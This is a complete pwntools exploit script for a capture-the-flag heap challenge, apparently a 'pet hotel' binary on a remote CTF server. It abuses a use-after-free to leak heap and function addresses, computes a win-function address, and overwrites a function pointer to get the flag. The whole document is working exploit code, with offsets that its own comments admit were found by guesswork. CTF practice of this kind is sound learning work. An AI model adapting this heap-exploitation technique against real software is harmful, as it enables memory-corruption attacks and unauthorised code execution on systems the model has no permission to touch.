from pwn import *

# p = process("./pethotel")
# gdb.attach(p)

p = remote("pwn.toys", 30013)

def CheckIn(room, species):
    p.recvuntil(b">")
    p.sendline(b"1")

    p.recvuntil(b">")
    p.sendline(f"{room}".encode())

    p.recvuntil(b">")
    p.sendline(f"{species}".encode())

def RegisterNewData(room, length, data):
    p.recvuntil(b">")
    p.sendline(b"2")

    p.recvuntil(b">")
    p.sendline(f"{room}".encode())

    p.recvuntil(b">")
    p.sendline(f"{length}".encode())

    p.recvuntil(b">")
    p.sendline(f"{data}".encode())


def DeleteRoom(room):
    p.recvuntil(b">")
    p.sendline(b"4")

    p.recvuntil(b">")
    p.sendline(f"{room}".encode())

def ViewRoom(room):
    p.recvuntil(b">") 
    p.sendline(b"3")

    p.recvuntil(b">")
    p.sendline(f"{room}".encode())

def RegisterAddressData(room, address):
    p.recvuntil(b">")
    p.sendline(b"2")

    p.recvuntil(b">")
    p.sendline(f"{room}".encode())

    p.recvuntil(b">")
    p.sendline(address)

log.info("Checking a cat into room 0 and a dog into room 1")
CheckIn(0,1)
CheckIn(1,2)

log.info("Placing 8 A's in room 0 and 8 B's in room 1")
RegisterNewData(0, 10, "A"*8) #creating small chunks to be the same size as the animal chunks
RegisterNewData(1, 10, "B"*8)

log.info("Deleting data from room 0 and 1")
DeleteRoom(0)
DeleteRoom(1)

log.info("Checking cat into room 7")
CheckIn(7, 1)

ViewRoom(0) # Leak heap address of room 7 through data of room 0
p.recvuntil(b"We have registered the following data on the guest:")
p.recvline()
leak = u64(p.recvline()[:8].strip().ljust(8,b"\x00"))
heap_leak = hex(leak) + "ef0" # eh... sure ¯\_(ツ)_/¯, thx gdb

log.success(f"heap: {heap_leak}")

log.info("Checking dog into room 7")
CheckIn(7, 2) # idk why this gets us an address leak but it works

ViewRoom(0) # Leak get species address of room 7 through data of room 0
p.recvuntil(b"We have registered the following data on the guest:")
p.recvline()
func_leak = u64(p.recvline()[:8].strip().ljust(8,b"\x00"))
log.success(f"get species: {hex(func_leak)=}")

win = func_leak - 0x299f
log.success(f"win: {hex(win)}")

log.info("Change data of room 0 to point to data of room 1")
RegisterAddressData(0, p64(int(heap_leak,16)+0x20))

log.info("Change data of room 1 to win func")
RegisterAddressData(1, p64(win))

log.info("Display room 7 to call win and get flag")
ViewRoom(7)

p.interactive()
